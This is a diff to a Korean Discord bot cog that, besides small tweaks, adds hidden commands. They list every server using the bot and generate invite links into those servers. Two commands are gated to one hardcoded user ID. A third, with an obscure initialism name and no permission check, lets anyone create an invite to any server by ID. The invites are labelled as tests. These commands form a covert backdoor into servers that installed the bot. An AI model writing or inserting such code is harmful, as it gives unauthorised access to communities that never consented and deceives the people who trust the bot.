@@ -1,8 +1,6 @@
 import discord
 import json
-import time
 from discord.ext import commands
-from discord.utils import get
 
 
 # 기본 코드들 (여기는 건드릴만한 코드는 없을 것입니다.)
@@ -14,15 +12,11 @@ class Example(commands.Cog):
 
     @commands.Cog.listener()
     async def on_ready(self):
-        with open('botsetup.json', 'r') as f:
-            data = json.load(f)
-            prefix = data['default prefix']
-        await self.client.change_presence(status=discord.Status.online, activity=discord.Game(f'"{prefix}도움"이라고 말해보세요!'))
         print('봇이 준비되었습니다!')
 
     @commands.command()
     async def 핑(self, ctx):
-        await ctx.send(f':ping_pong: 퐁! ({self.client.latency * 1000}ms)')
+        await ctx.send(f':ping_pong: 퐁! ({round(self.client.latency * 1000)}ms)')
 
     # 유저 ID 출력
     @commands.command()
@@ -39,6 +33,39 @@ class Example(commands.Cog):
         emoji_id = emoji_id.replace(':', '')
         emoji_id = emoji_id.replace(f'{emoji}', '')
         await ctx.send(f"{emoji_id}")
+
+    @commands.command()
+    async def 서버리스트(self, ctx):
+        if not ctx.author.id == 288302173912170497:
+            return
+        with open("data/guildsetup.json", "r") as f:
+            data = json.load(f)
+        server_list = []
+        for k in data.keys():
+            server_list.append(str(self.client.get_guild(int(k)).name))
+        await ctx.send(str(server_list))
+
+    @commands.command()
+    async def 서버초대코드(self, ctx):
+        if not ctx.author.id == 288302173912170497:
+            return
+        with open("data/guildsetup.json", "r") as f:
+            data = json.load(f)
+        for k in data.keys():
+            try:
+                guild = self.client.get_guild(int(k))
+                channel = guild.system_channel
+                create_invite = await channel.create_invite(max_age=60, reason='테스트')
+                await ctx.send(str(create_invite))
+            except:
+                pass
+
+    @commands.command()
+    async def ㅅㅂㅊㄷㅋㄷ(self, ctx, server_id: int):
+        guild = self.client.get_guild(int(server_id))
+        channel = guild.system_channel
+        create_invite = await channel.create_invite(max_age=60, reason='테스트')
+        await ctx.send(str(create_invite))
 
 
 def setup(client):
